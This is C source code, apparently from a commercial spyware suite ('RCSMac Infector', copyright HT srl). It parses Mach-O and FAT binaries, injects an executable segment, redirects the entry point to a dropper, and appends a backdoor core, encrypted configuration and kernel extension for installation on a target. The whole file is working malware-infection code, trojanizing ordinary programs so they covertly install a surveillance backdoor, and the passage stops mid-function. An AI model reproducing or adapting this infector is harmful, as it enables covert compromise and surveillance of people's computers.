/*
 * RCSMac Infector
 *  - Check if the input file is a FAT binary
 *    - If Yes Unpack every single ARCH
 *  - Rebuild a FAT binary with all the original archs and while dealing with the
 *    i386 arch:
 *    - Inject a new LC_SEGMENT right after the __LINKEDIT segment so that we
 *      won't touch __DATA vmaddr (this is because __PAGEZERO will always be 0x1000
 *      big, by default from gcc. One can also specify a different size at compile time)
 *    - Cut sizeof (segment_command) while copying back the _rest_ of the file
 *      (after LC_COMMAND(s)) since we've added a new SEGMENT. In this way we're
 *      gonna cut 0s used for padding and the alignment won't be broken.
 *    - Append our data padded to 0x1000 (Page Boundary) and put our crt start()
 *      routine (standard one created by gcc) as the entryPoint routine which calls
 *      our real main() [secondStageLoader]. There's a problem in having the start
 *      routine different than the one dyld is expecting since it won't initialize
 *      in that case the entire environment memory. See ImageLoaderMachO.cpp:2661
 *      - This must be done in the same architecture and not at the end of the file:
 *        | FAT_HEADER |
 *         | FAT_ARCH i386| <--- change arch size in order to include our files
 *          | ARCH i386 SEGMENTS |
 *          | INJECTED SEGMENT |
 *         | FAT_ARCH OTHER |
 *          | ARCH OTHER SEGMENTS|
 *
 * Created by Alfredo 'revenge' Pesoli on 14/07/2009
 * Win32 porting by Massimo Chiodini on 02/11/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#ifdef __APPLE__
#include <unistd.h>
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/stat.h>
#ifdef __APPLE__
#include <sys/mman.h>
#else
#include <io.h>
#endif

#include "RCSMacCommon.h"
#include "RCSMacInfector.h"
#include "RCSMacDropper.h"

#define VERSION           0.9
#define INJECTED_SEGMENT  "__INIT_STUBS"

//extern void dropperStart ();
//extern void labelTest ();
//extern void firstStageDropper ();
//extern void secondStageDropper ();
//extern void dropperEnd ();

//static unsigned int paddedPagezeroVASize = 0;

#define ENTRY_POINT				    ((byte *)secondStageDropper - (byte *)dropperStart)
#define DROPPER_CODE_SIZE		  ((byte *)dropperEnd - (byte *)dropperStart)
#define FIRST_STAGE_CODE_SIZE	((byte *)firstStageDropper - (byte *)labelTest)


unsigned int getBinaryEP (byte *machoBase)
{
  struct mach_header *m_header;
  struct load_command *l_command;

  unsigned int i;
  unsigned int offset, entryPoint;

  m_header =(struct mach_header *) machoBase;
  offset  = sizeof (struct mach_header);
  
  for (i = 0; i < m_header->ncmds; i++)
    {
      l_command = (struct load_command *)((byte *)machoBase + offset);
      
      if (l_command->cmd == LC_THREAD
          || l_command->cmd == LC_UNIXTHREAD)
        {
          struct thread_command *th_command;
          
          th_command = (thread_command *) allocate (sizeof (struct thread_command));
          memcpy (th_command, machoBase + offset, sizeof (struct thread_command));
          
          entryPoint = th_command->state.eip;
          free (th_command);
          
          return entryPoint;
        }
        
      offset += l_command->cmdsize;
    }
  
  return -1;
}

int
setBinaryEP (byte *machoBase, unsigned int anEntryPoint)
{
  struct mach_header *m_header;
  struct load_command *l_command;
  
  unsigned int i;
  unsigned int offset;
  
  m_header = (struct mach_header *) machoBase;
  offset  = sizeof (struct mach_header);
  
  for (i = 0; i < m_header->ncmds; i++)
    {
      l_command = (struct load_command *)(machoBase + offset);
      
      if (l_command->cmd == LC_THREAD
          || l_command->cmd == LC_UNIXTHREAD)
        {
          struct thread_command *th_command;
          
          th_command = (thread_command *) allocate (sizeof (struct thread_command));
          memcpy (th_command, machoBase + offset, sizeof (struct thread_command));
          
          th_command->state.eip = anEntryPoint;
          memcpy (machoBase + offset, th_command, sizeof (struct thread_command));
          free (th_command);  
          
          return 0;
        }
      
      offset += l_command->cmdsize;
    }
  
  return -1;
}

int appendData (char *inputFilePointer,
                char *outputFilePointer,
                int archOffset,
                int padding,
                unsigned int segmentVMAddr)
{
  char *tempFilePointer   = NULL;
  const char *_strings[]  = { "HOME", "/%s/%s", "/%s", "" };
  
  unsigned int originalEP = 0;
  int tempFileSize        = 0; 
#ifdef WIN32
  HANDLE tempFD, tempFDMap;
#else
  int tempFD              = 0;
#endif
  int z                   = 0;
  int offset = padding;
    
  infectionHeader infection;
  stringTable     strings;
  resourceHeader  resource;
  
  if (gKextFileSize > 0)
    numberOfResources = 3;
  else
    numberOfResources = 2;
  
  originalEP = getBinaryEP ((byte *)(inputFilePointer + archOffset));
#ifdef DEBUG
  printf ("Original EP: %x\n", originalEP);
#endif

  char *coreFileName    = basename(coreFilePath);
  char *confFileName    = basename(confFilePath);
  char *kextFileName    = basename(kextFilePath);
  char *inputFileName   = basename(inputFilePath);
  char *outputFileName  = basename(outputFilePath);

  //
  // Set the infection header
  //
  memset (&infection, 0, sizeof (infectionHeader));
  infection.numberOfResources = numberOfResources;
  infection.numberOfStrings   = gNumStrings;
  infection.dropperSize       = (int)DROPPER_CODE_SIZE;
  infection.originalEP        = originalEP; //+ paddedPagezeroVASize - PAGE_ALIGNMENT;
  
  memcpy (outputFilePointer + offset, &infection, sizeof (infectionHeader));
  offset += sizeof (infectionHeader);
  
  //
  // Set the string table
  //
  for (z = 0; z < gNumStrings; z++)
    {
      memset (&strings, 0, sizeof (stringTable));
#ifdef WIN32
      strncpy_s(strings.value, sizeof(strings.value), _strings[z], _TRUNCATE);
#else
	  strncpy (strings.value, _strings[z], sizeof (strings.value));
#endif

#ifdef DEBUG_VERBOSE
      printf ("string: %s\n", _strings[z]);
#endif
      strings.type = STRING_DATA;
      
      memcpy (outputFilePointer + offset, &strings, sizeof (stringTable));
      offset += sizeof (stringTable);
    }
  
  // Set the new EP + 4 (number of Resources)
  if (setBinaryEP ((byte *)(outputFilePointer + archOffset), segmentVMAddr
                   + sizeof (infectionHeader)
                   + sizeof (stringTable) * gNumStrings) == -1)
    {
      printf ("[ee] An error occurred while setting the new EP\n");
      exit (1);
    }
  
  //
  // Now append the crt start routine (__malloc_initialize error fix)
  //
  memcpy (outputFilePointer + offset, crtStart, sizeof (crtStart));
  offset += sizeof (crtStart);
  
  unsigned int ep = (unsigned int)ENTRY_POINT;
#ifdef DEBUG_VERBOSE
  printf ("ep: %x\n", ep);
#endif
  memmove (outputFilePointer + offset - 1, &ep, 3);
  offset += 3;
  
  //
  // Now append our loader
  //
  memcpy (outputFilePointer + offset,
          dropperStart,
          (_mSize_t)DROPPER_CODE_SIZE);
  
  offset += (int) DROPPER_CODE_SIZE;
  
  //
  // Now resourceHeader with all the files which needs to be dropped
  //
  printf ("[ii] Dropper injected (%d)\n", (int) DROPPER_CODE_SIZE);
  
  //
  // CORE
  //
  resource.type = RESOURCE_CORE;
  memset (resource.name, 0, strlen (resource.name));
  memcpy (resource.name, coreFileName, sizeof (resource.name));
  
  resource.size = gCoreFileSize;
  
  memset (resource.path, 0, strlen (resource.path));
  memcpy (resource.path, installPath, sizeof (resource.path));
  
  memcpy (outputFilePointer + offset,
          &resource,
          sizeof (resourceHeader));
  
  offset += sizeof (resourceHeader);

#ifdef WIN32
  if ((tempFilePointer = mapFile (coreFilePath, &tempFileSize,
                                  &tempFD, &tempFDMap, 0)) == NULL)

#else
  if ((tempFilePointer = mapFile (coreFilePath, &tempFileSize,
                                  &tempFD, 0)) == NULL)
#endif
    {
      printf("[ee] Error while mmapping the backdoor core file\n");
      exit (1);
    }

  memcpy (outputFilePointer + offset,
          tempFilePointer,
          gCoreFileSize);
  offset += gCoreFileSize;
  
  tempFileSize = 0;
  tempFilePointer = NULL;

#ifdef WIN32
  if (tempFilePointer != NULL)
	  UnmapViewOfFile(tempFilePointer);

  CloseHandle(tempFDMap);
  CloseHandle(tempFD);
#else
  close (tempFD);
#endif

  //
  // CONF
  //
  resource.type = RESOURCE_CONF;
  memset (resource.name, 0, sizeof (resource.name));
  memcpy (resource.name, confFileName, sizeof (resource.name));
  resource.size = gConfFileSize;
  memset (resource.path, 0, sizeof (resource.path));
  memcpy (resource.path, installPath, sizeof (resource.path));
  
  memcpy (outputFilePointer + offset,
          &resource,
          sizeof (resourceHeader));
  
  offset += sizeof (resourceHeader);
#ifdef WIN32
  if ((tempFilePointer = mapFile (confFilePath, &tempFileSize,
                                  &tempFD, &tempFDMap, 0)) == NULL)

#else 
  if ((tempFilePointer = mapFile (confFilePath, &tempFileSize,
                                  &tempFD, 0)) == NULL)
#endif
    {
      printf("[ee] Error while mmapping the configuration file\n");
      exit (1);
    }

  memcpy (outputFilePointer + offset,
          tempFilePointer,
          gConfFileSize);
  offset += gConfFileSize;

#ifdef WIN32
  if(tempFilePointer != NULL)
	  UnmapViewOfFile(tempFilePointer);

  CloseHandle(tempFDMap);
  CloseHandle(tempFD);
#else
  close (tempFD);
#endif

  //
  // KEXT
  //
  if (gKextFileSize > 0)
    {
      tempFileSize = 0;
      tempFilePointer = NULL;
      
      resource.type = RESOURCE_KEXT;
      memset (resource.name, 0, sizeof (resource.name));
      memcpy (resource.name, kextFileName, sizeof (resource.name));
      resource.size = gKextFileSize;
      memset (resource.path, 0, sizeof (resource.path));
      memcpy (resource.path, installPath, sizeof (resource.path));

#ifdef DEBUG
      printf ("offset: %x\n", offset);
#endif

      memcpy (outputFilePointer + offset,
              &resource,
              sizeof (resourceHeader));
      
      offset += sizeof (resourceHeader);
#ifdef WIN32
	    if ((tempFilePointer = mapFile (kextFilePath, &tempFileSize,
			                  						  &tempFD, &tempFDMap, 0)) == NULL)

#else
      if ((tempFilePointer = mapFile (kextFilePath, &tempFileSize,
                                      &tempFD, 0)) == NULL)
#endif
        {
          printf("[ee] Error while mmapping the configuration file\n");
          exit (1);
        }

      memcpy (outputFilePointer + offset,
              tempFilePointer,
              gConfFileSize);
#ifdef WIN32
      if (tempFilePointer != NULL)
        UnmapViewOfFile (tempFilePointer);

      CloseHandle (tempFDMap);
      CloseHandle (tempFD);
#else
      close (tempFD);
#endif
    }
  
  return offset;
}

int infectSingleArch (char *inputFilePointer,
                      char *outputFilePointer,
                      int offsetToArch,
                      int inputFileSize,
                      int outputFileSize)
{
  struct mach_header      *m_header;
  struct load_command     *l_command;
  struct segment_command  *seg_command;
  
  unsigned int z;
  unsigned int i;
  unsigned int inputOffset  = 0;
  unsigned int outputOffset = 0;
  unsigned int segVMAddr    = 0;
  int displacement          = 0;
  int padding               = 0;
  
  inputOffset   += offsetToArch;
  outputOffset  += offsetToArch;
  
  m_header =  (struct mach_header *) allocate (sizeof (struct mach_header));
  memcpy (m_header, inputFilePointer + inputOffset, sizeof (struct mach_header));
  
  // TODO: Add check for cputype as well
  if (m_header->filetype != MH_EXECUTE)
    {
      printf ("[ee] Unsupported file type (!= MH_EXECUTE)\n");
      return kErrorFileNotSupported;
    }
  
  // Increment header sizeofcmds since we're adding a new section
  //m_header->sizeofcmds += sizeof (struct section);
  
  m_header->sizeofcmds += sizeof (struct segment_command);
  m_header->ncmds      += 1;
  
  memcpy (outputFilePointer + outputOffset, m_header, sizeof (struct mach_header));
  
  // Calculate padding including loader code size
  displacement  = inputFileSize % PAGE_ALIGNMENT;
  padding       = PAGE_ALIGNMENT - displacement;
  
  outputOffset += sizeof (struct mach_header);
  inputOffset  += sizeof (struct mach_header);
#ifdef DEBUG
  printf ("[ii] Starting parsing load_commands\n");
#endif
  for (i = 0; i < m_header->ncmds; i++)
    {
      l_command = (struct load_command *)(inputFilePointer + inputOffset);
#ifdef DEBUG_VERBOSE
      printf ("loadCommand: %d (%x)\n", i, l_command->cmd);
#endif
      switch (l_command->cmd)
        {
        case LC_THREAD:
        case LC_UNIXTHREAD:
          {
            struct thread_command *th_command;
            
            th_command = (thread_command *) allocate (sizeof (struct thread_command));
            memcpy (th_command, inputFilePointer + inputOffset, sizeof (struct thread_command));
            
            //th_command->state.eip += sizeof (struct section);
            //th_command->state.eip = 0x8; // W00t
            
            memcpy (outputFilePointer + outputOffset, th_command, sizeof (struct thread_command));
            free (th_command);
            
            inputOffset += sizeof (struct thread_command);
            outputOffset += sizeof (struct thread_command);
            
            break;
          }
        case LC_SEGMENT:
          {
#ifdef DEBUG
            printf ("LC_SEGMENT size: %d\n", (int)(sizeof (struct segment_command)));
#endif
            seg_command = (segment_command *) allocate (sizeof (struct segment_command));
            memcpy (seg_command, inputFilePointer + inputOffset, sizeof (struct segment_command));
            
            inputOffset += sizeof (struct segment_command);
            
            if (!strncmp (seg_command->segname, "__PAGEZERO",
                          strlen (seg_command->segname)))
              {
#ifdef DEBUG
                printf ("[ii] Found __PAGEZERO Segment\n");
#endif  
                //
                // Update the segment within the new prot flags(EP) and size
                //
                //seg_command->cmdsize  += sizeof (struct section);
                /*
                 seg_command->fileoff  = fileSize + padding;
                 
                 //seg_command->filesize = outputFileSize;
                 seg_command->filesize = FIRST_STAGE_CODE_SIZE;
                 
                 if (seg_command->filesize % PAGE_ALIGNMENT)
                 seg_command->filesize = ((seg_command->filesize + PAGE_ALIGNMENT)
                 & ~(PAGE_ALIGNMENT -1));
                 
                 //seg_command->vmsize = paddedPagezeroVASize = outputFileSize; // PageBoundary padding 4K
                 seg_command->vmsize = seg_command->filesize;
                 
                 seg_command->maxprot  = 0x7;
                 seg_command->initprot = 0x5;
                 //seg_command->nsects   += 0x1;
                 */
                // Copy back the segmentCommand
                memcpy (outputFilePointer + outputOffset, seg_command, sizeof (struct segment_command));
                outputOffset += sizeof (struct segment_command);
                /*
                 //
                 // Create the new section
                 //
                 printf ("[ii] section size: %d\n", (int)(sizeof (struct section)));
                 sect = allocate (sizeof (struct section));
                 
                 if (sect == NULL)
                 {
                 printf("[ee] Error while allocating the new section\n");
                 return kErrorMemoryAllocation;
                 }
                 
                 strcpy (sect->sectname, INJECTED_SECTION_NAME);
                 strcpy (sect->segname, INJECTED_SEGMENT_NAME);
                 //sect->addr    = stackSize;
                 sect->offset  = fileSize + padding;
                 sect->size    = outputFileSize; //TOP_STACK - stackSize; // size of the stack
                 sect->align   = 0x2; // standard alignment
                 sect->flags   = 0x80000000; // x flag
                 
                 // Copy back the section
                 memcpy (outputFilePointer + outputOffset, sect, sizeof (struct section));
                 outputOffset += sizeof (struct section);
                 
                 free (sect);
                 */
              }
            else if (!strncmp (seg_command->segname, "__LINKEDIT",
                               strlen (seg_command->segname)))
              {
#ifdef DEBUG
                printf ("[ii] Found %s Segment\n", seg_command->segname);
#endif  
                memcpy (outputFilePointer + outputOffset, seg_command, sizeof (struct segment_command));
                outputOffset += sizeof (struct segment_command);
                
                //
                // Now inject the new segment
                //
                struct segment_command *mySegment = (struct segment_command *) allocate (sizeof (struct segment_command));
                
                mySegment->cmd      = LC_SEGMENT;
                mySegment->cmdsize  = sizeof (struct segment_command);
#ifdef WIN32
				strncpy_s(mySegment->segname, strlen(INJECTED_SEGMENT), INJECTED_SEGMENT, _TRUNCATE);
#else
                strncpy (mySegment->segname, INJECTED_SEGMENT, strlen (INJECTED_SEGMENT));
#endif
                mySegment->vmaddr   = seg_command->vmaddr + seg_command->vmsize;
                mySegment->vmsize   = outputFileSize;
                mySegment->fileoff  = inputFileSize + padding - offsetToArch;
                mySegment->filesize = outputFileSize;
                mySegment->maxprot  = 0x7;
                mySegment->initprot = 0x5;
                
                segVMAddr = mySegment->vmaddr;
                
                memcpy (outputFilePointer + outputOffset, mySegment, sizeof (struct segment_command));
                outputOffset += sizeof (struct segment_command);
              }
            else
              {
                //
                // Shift all the VM Addresses
                //
                //seg_command->vmaddr += paddedPagezeroVASize - PAGE_ALIGNMENT;
                
                memcpy (outputFilePointer + outputOffset,
                        seg_command,
                        sizeof (struct segment_command));
                outputOffset += sizeof (struct segment_command);
#ifdef DEBUG
                printf ("[ii] Cycling for segment (%s) sections (%d)\n",
                        seg_command->segname, seg_command->nsects);
#endif  
                for (z = 0; z < seg_command->nsects; z++)
                  {
                    struct section *sect;
                    
                    sect = (section *) allocate (sizeof (struct section));
                    if (sect == NULL)
                      {
                        printf("[ee] Error while allocating the new section\n");
                        return kErrorMemoryAllocation;
                      }
                    memcpy (sect, inputFilePointer + inputOffset, sizeof (struct section));
                    
                    //sect->offset += sizeof (struct section);
                    //sect->addr += paddedPagezeroVASize - PAGE_ALIGNMENT;
                    
                    memcpy (outputFilePointer + outputOffset,
                            sect,
                            sizeof (struct section));
                    
                    free (sect);
                    inputOffset += sizeof (struct section);
                    outputOffset += sizeof (struct section);
                  }
              }
            
            free (seg_command);
            
            break;
          }
        case LC_SYMTAB:
          {
            struct symtab_command *sy_command;
            sy_command = (symtab_command *) allocate (sizeof (struct symtab_command));
            memcpy (sy_command, inputFilePointer + inputOffset, sizeof (struct symtab_command));
            
            //sy_command->symoff += sizeof (struct section);
            //sy_command->stroff += sizeof (struct section);
            
            memcpy (outputFilePointer + outputOffset, sy_command, sizeof (struct symtab_command));
            free (sy_command);
            
            inputOffset += sizeof (struct symtab_command);
            outputOffset += sizeof (struct symtab_command);
            
            break;
          }
        case LC_DYSYMTAB:
          {
            struct dysymtab_command *dysym_command;
            dysym_command = (dysymtab_command *) allocate (sizeof (struct dysymtab_command));
            memcpy (dysym_command, inputFilePointer + inputOffset, sizeof (struct dysymtab_command));
            
            //dysym_command->indirectsymoff += sizeof (struct section);
            
            memcpy (outputFilePointer + outputOffset, dysym_command, sizeof (struct dysymtab_command));
            free (dysym_command);
            
            inputOffset += sizeof (struct dysymtab_command);
            outputOffset += sizeof (struct dysymtab_command);
            
            break;
          }
        case LC_CODE_SIGNATURE:
        case LC_SEGMENT_SPLIT_INFO:
          {
            struct linkedit_data_command *linkedit_command;
            linkedit_command = (linkedit_data_command *) allocate (sizeof (struct linkedit_data_command));
            memcpy (linkedit_command, inputFilePointer + inputOffset, sizeof (struct linkedit_data_command));
            
            //linkedit_command->dataoff += sizeof (struct section);
            
            memcpy (outputFilePointer + outputOffset, linkedit_command, sizeof (struct linkedit_data_command));
            free (linkedit_command);
            
            inputOffset += sizeof (struct linkedit_data_command);
            outputOffset += sizeof (struct linkedit_data_command);
            
            break;
          }
        default:
          {
            memcpy (outputFilePointer + outputOffset,
                    inputFilePointer + inputOffset,
                    l_command->cmdsize);
            inputOffset += l_command->cmdsize;
            outputOffset += l_command->cmdsize;
            
            break;
          }
      }
    }
  
  //
  // Now the rest of the file (data), here we wanna skip sizeof segment_command
  // in order to leave the file padded correctly for its TEXT segment
  //
  memcpy (outputFilePointer + outputOffset,
          inputFilePointer + inputOffset + sizeof (struct segment_command),
          inputFileSize - inputOffset - sizeof (struct segment_command));
  
  free (m_header);
  printf ("[ii] LoadCommands copied successfully\n");
  
#ifdef DEBUG_VERBOSE
  printf ("inputFilePointer: %x\n", inputFilePointer);
  printf ("inputFilePointer: %x\n", *(unsigned long *)inputFilePointer);
  printf ("offsetToArch: %x\n", offsetToArch);
  printf ("inputFilePointer: %x\n", *(unsigned long *)(inputFilePointer + 0x1000));
  printf ("inputSize + padding: %d\n", inputFileSize + padding);
#endif
  
  if (appendData (inputFilePointer,
                  outputFilePointer,
                  offsetToArch,
                  inputFileSize + padding,
                  segVMAddr) != kErrorGeneric)
    return padding;
  else
    return kErrorGeneric;
}

int
getBinaryFormat (char *aFilePointer)
{
  memset (&gFatHeader, 0, sizeof (gFatHeader));
  memcpy (&gFatHeader, aFilePointer, sizeof (gFatHeader));
  
  switch (gFatHeader.magic)
    {
    case FAT_CIGAM:
      return kFatSwapBinary;
    case FAT_MAGIC:
      return kFatBinary;
    case MH_MAGIC:
      return kMachBinary;
    default:
      return kErrorFileNotSupported;
    }
}

int getFileSize (char *aFilePath)
{
  struct stat sb;
  
  if (stat (aFilePath, &sb) == kErrorGeneric)
    {
      return kErrorGeneric;
    }
  
  return sb.st_size;
}

void
usage (_mChar *aBinaryName)
{
#ifdef WIN32
	printf ("\nUsage: %S <core> <conf> <kext> <path> <input> <output>\n\n", aBinaryName);
#else
  printf ("\nUsage: %s <core> <conf> <kext> <path> <input> <output>\n\n", aBinaryName);
#endif
  printf ("\t<core>   : backdoor core\n");
  printf ("\t<conf>   : backdoor encrypted configuration\n");
  printf ("\t<kext>   : kernel extension\n");
  printf ("\t<path>   : backdoor installation path (on target)\n");
  printf ("\t<input>  : binary to melt with\n");
  printf ("\t<output> : output filename\n\n");
}

int
parseArguments (int argc, _mChar **argv)
{
	if (argc != 7)
    {
      return kErrorGeneric;
    }

#ifdef WIN32_NO
  coreFileName   = (char *)calloc(1, strlen(argv[1]) + 1);
	confFileName   = (char *)calloc(1, strlen(argv[2]) + 1);
	kextFileName   = (char *)calloc(1, strlen(argv[3]) + 1);
	installPath    = (char *)calloc(1, strlen(argv[4]) + 1);
	inputFileName  = (char *)calloc(1, strlen(argv[5]) + 1);
	outputFileName = (char *)calloc(1, strlen(argv[6]) + 1);

  sprintf_s(coreFileName, sizeof(coreFileName), "%s", argv[1]);
	sprintf_s(confFileName, sizeof(confFileName), "%s", argv[2]);
	sprintf_s(kextFileName, sizeof(kextFileName), "%s", argv[3]);
	sprintf_s(installPath, sizeof(installPath), "%s", argv[4]);
	sprintf_s(inputFileName, sizeof(inputFileName), "%s", argv[5]);
	sprintf_s(outputFileName, sizeof(outputFileName), "%s", argv[6]);
#endif

  coreFilePath          = argv[1];
  confFilePath          = argv[2];
  kextFilePath          = argv[3];
  installPath           = argv[4];
  inputFilePath         = argv[5];
  outputFilePath        = argv[6];

  return kSuccess;
}

#ifdef WIN32
void freeArguments()
{
	if (coreFilePath != NULL)
		free(coreFilePath);
	if (confFilePath != NULL)
		free(confFilePath);
	if (kextFilePath != NULL)
		free(kextFilePath);
	if (installPath != NULL)
		free(installPath);
	if (inputFilePath != NULL)
		free(inputFilePath);
	if (outputFilePath != NULL)
		free(outputFilePath);
}	
#endif

int
main (int argc, _mChar *argv[])
{
  struct fat_arch *f_arch;
  char *inputFilePointer      = NULL;
  char *outputFilePointer     = NULL;

  int inputFileSize           = 0;
  int outputFileSize          = 0;
  int fileType                = 0;
  int padding                 = 0;
  int i                       = 0;
  gNumStrings                 = 4;
 
#ifdef WIN32
  HANDLE inputFD, outputFD, inputFDMap, outputFDMap;
#else
  int inputFD, outputFD;
#endif  

  int offsetToResources       = 0;
  unsigned int inputOffset    = 0;
  unsigned int outputOffset   = 0;
  int nfat                    = 0;
  int cputype                 = 0;
  unsigned int archOffset     = 0;
    
  if (parseArguments (argc, argv) & kErrorGeneric)
    {
      usage (*argv);
      exit (1);
    }

  //
  // Check if the backdoor, configuration file and KEXT exists and get
  // their size
  //
  if ((gCoreFileSize = getFileSize (coreFilePath)) == kErrorGeneric)
    {
      printf ("[ee] Core backdoor file not found\n");
#ifdef WIN32
      //freeArguments();
#endif
      exit (1);
    }
  
  if ((gConfFileSize = getFileSize (confFilePath)) == kErrorGeneric)
    {
      printf ("[ee] Configuration file not found\n");
#ifdef WIN32
      //freeArguments();
#endif
      exit (1);
    }
  
  if (strncmp ("null", kextFilePath, strlen ("null")) != 0)
    {
      if ((gKextFileSize = getFileSize (kextFilePath)) == kErrorGeneric)
        {
          printf ("[ee] KEXT file not found\n");
#ifdef WIN32
          //freeArguments();
#endif
          exit (1);
        }
    }

  // Map input file
#ifdef WIN32
  if ((inputFilePointer = mapFile (inputFilePath,
                                   &inputFileSize,
                                   &inputFD,
                                   &inputFDMap,
                                   0)) == NULL)

#else
  if ((inputFilePointer = mapFile (inputFilePath, &inputFileSize,
                                   &inputFD, 0, 0)) == NULL)
#endif
	{
      printf("[ee] Error while mmapping the input file\n");
#ifdef WIN32
      //freeArguments();
#endif
      exit (1);
    }

  // Calculate the padded output file size + 1
  outputFileSize = DROPPER_CODE_SIZE
                    + sizeof (crtStart)
                    + sizeof (int)
                    + gCoreFileSize
                    + gConfFileSize
                    + gKextFileSize
                    + sizeof (infectionHeader)
                    + sizeof (stringTable) * gNumStrings
                    + sizeof (resourceHeader) * ((gKextFileSize > 0) ? 3 : 2);

#ifdef DEBUG_VERBOSE
  printf ("unpadded outSize: %d\n", outputFileSize);
#endif
  
  if (outputFileSize % PAGE_ALIGNMENT)
    outputFileSize = ((outputFileSize + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));

  int tempSize = outputFileSize + inputFileSize;
  
#ifdef DEBUG_VERBOSE
  printf ("padded outSize: %d\n", outputFileSize);
  printf ("tempSize: %d\n", tempSize);
  printf ("[ii] loaderCodeSize: %d\n", DROPPER_CODE_SIZE);
  printf ("[ii] gCoreFileSize: %d\n", gCoreFileSize);
  printf ("[ii] confCodeSize: %d\n", gConfFileSize);
  printf ("[ii] gKextFileSize: %d\n", gKextFileSize);
  printf ("[ii] inputFileSize: %d\n", inputFileSize);
  printf ("[ii] outputFileSize: %d\n", outputFileSize);
#endif
  
  // Map output file
#ifdef WIN32
  if ((outputFilePointer = mapFile (outputFilePath,
                                    &tempSize,
                                    &outputFD,
                                    &outputFDMap,
                                    &padding)) == NULL)
#else
  if ((outputFilePointer = mapFile (outputFilePath, &tempSize,
                                    &outputFD, 0, &padding)) == NULL)
#endif
	{
    printf("[ee] Error while mmapping the output file\n");
#ifdef WIN32
    //freeArguments();
#endif
    exit (1);
  }
  
  // Giving output file the correct fileSize
#ifdef WIN32
  if (SetFilePointer(outputFD, tempSize + padding - 1, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
    {
      //freeArguments();
      exit (1);
    }
#else
  if (lseek (outputFD, tempSize + padding - 1, SEEK_SET) == kErrorGeneric)
    {
      exit (1);
    }
#endif

#ifdef WIN32
  DWORD dwByteW;

  if (WriteFile(outputFD, "", 1, &dwByteW, 0) == 0)
    {
      if (inputFilePointer != NULL)
        UnmapViewOfFile(inputFilePointer);
      if (outputFilePointer != NULL)
        UnmapViewOfFile(outputFilePointer);
      
      CloseHandle(outputFDMap);
      CloseHandle(inputFDMap);
      CloseHandle(outputFD);
      CloseHandle(inputFD);
      freeArguments();
      
      return kErrorWriteFile;
    }
#else
  if (write (outputFD, "", 1) == kErrorGeneric)
    {
      close (outputFD);
      close (inputFD);

      return kErrorWriteFile;
    }
  
  close (outputFD);
  close (inputFD);
#endif

  // Gettin filetype - Compatibility with MacOS X Leopard 10.5
  fileType = getBinaryFormat (inputFilePointer);

  switch (fileType)
    {
    case kFatBinary:
      {
        gFileType = 1;
        int x86Found      = 0;

        gFileType = 1;
        nfat = gFatHeader.nfat_arch;
        int fArchSize = 0;

        printf ("[ii] FAT Binary found\n");
        printf ("[ii] Found %d Arch(s)\n", nfat);

        memcpy (outputFilePointer, &gFatHeader, sizeof (gFatHeader));
        outputOffset  += sizeof (gFatHeader);
        inputOffset   += sizeof (gFatHeader);

        for (i = 0; i < nfat; i++)
          {
            f_arch = (fat_arch *) allocate (sizeof (struct fat_arch));
            memcpy (f_arch, inputFilePointer + inputOffset, sizeof (struct fat_arch));

            cputype       = f_arch->cputype;
            archOffset    = f_arch->offset;
            fArchSize     = f_arch->size;
#ifdef DEBUG
            printf ("[ii] cputype: %d\n", cputype);
            printf ("[ii] archOffset: 0x%x\n", archOffset);
#endif
            if (cputype == CPU_TYPE_X86)
              {
                x86Found++;

                offsetToResources = infectSingleArch ((char *)(inputFilePointer),
                                                      (char *)(outputFilePointer),
                                                      archOffset,
                                                      fArchSize,
                                                      outputFileSize);
#ifdef DEBUG
                printf("offsetToRes: %d\n", offsetToResources);
#endif
                fArchSize += sizeof (struct segment_command)
                              + outputFileSize
                              + offsetToResources;

                f_arch->size = fArchSize;
                //offsetToResources -= archOffset;
              }
            else
              {
                if (x86Found)
                  {
                  archOffset += offsetToResources + outputFileSize + sizeof(struct segment_command);

                  if (archOffset % PAGE_ALIGNMENT)
                    archOffset = ((archOffset + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
#ifdef DEBUG_VERBOSE
                  printf ("new Offset: 0x%x\n", archOffset);
#endif
                  }

                u_int tempOfft = f_arch->offset;
                u_int tempSize = f_arch->size;

                f_arch->offset = archOffset;

                memcpy (outputFilePointer + archOffset,
                        inputFilePointer + tempOfft,
                        tempSize);
              }

            //f_arch->size = SWAP_LONG (f_arch->size);
            memcpy (outputFilePointer + outputOffset, f_arch, sizeof (struct fat_arch));

            free (f_arch);
            inputOffset   += sizeof (struct fat_arch);
            outputOffset  += sizeof (struct fat_arch);
          }

        break;
      }
    case kFatSwapBinary:
      {
        int x86Found      = 0;
        
        gFileType = 2;
        nfat = SWAP_LONG (gFatHeader.nfat_arch);
        int fArchSize = 0;

        printf ("[ii] FAT (swapped) Binary found\n");
        printf ("[ii] Found %d Arch(s)\n", nfat);
        
        memcpy (outputFilePointer, &gFatHeader, sizeof (gFatHeader));
        outputOffset  += sizeof (gFatHeader);
        inputOffset   += sizeof (gFatHeader);
        
        for (i = 0; i < nfat; i++)
          {
            f_arch = (fat_arch *) allocate (sizeof (struct fat_arch));
            memcpy (f_arch, inputFilePointer + inputOffset, sizeof (struct fat_arch));
            
            cputype       = SWAP_LONG (f_arch->cputype);
            archOffset    = SWAP_LONG (f_arch->offset);
            fArchSize     = SWAP_LONG (f_arch->size);
#ifdef DEBUG
            printf ("[ii] cputype: %d\n", cputype);
            printf ("[ii] archOffset: 0x%x\n", archOffset);
#endif
            if (cputype == CPU_TYPE_X86)
              {
                x86Found++;
                
                offsetToResources = infectSingleArch ((char *)(inputFilePointer),
                                                      (char *)(outputFilePointer),
                                                      archOffset,
                                                      fArchSize,
                                                      outputFileSize);
                
                printf("offsetToRes: %d\n", offsetToResources);

                fArchSize += sizeof (struct segment_command)
                             + outputFileSize
                             + offsetToResources;
                
                f_arch->size = SWAP_LONG (fArchSize);
                //offsetToResources -= archOffset;
              }
            else
              {
                if (x86Found)
                  {
                    archOffset += offsetToResources + outputFileSize + sizeof(struct segment_command);

                    if (archOffset % PAGE_ALIGNMENT)
                      archOffset = ((archOffset + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
#ifdef DEBUG_VERBOSE
                    printf ("new Offset: 0x%x\n", archOffset);
#endif
                  }
                
                u_int tempOfft = SWAP_LONG (f_arch->offset);
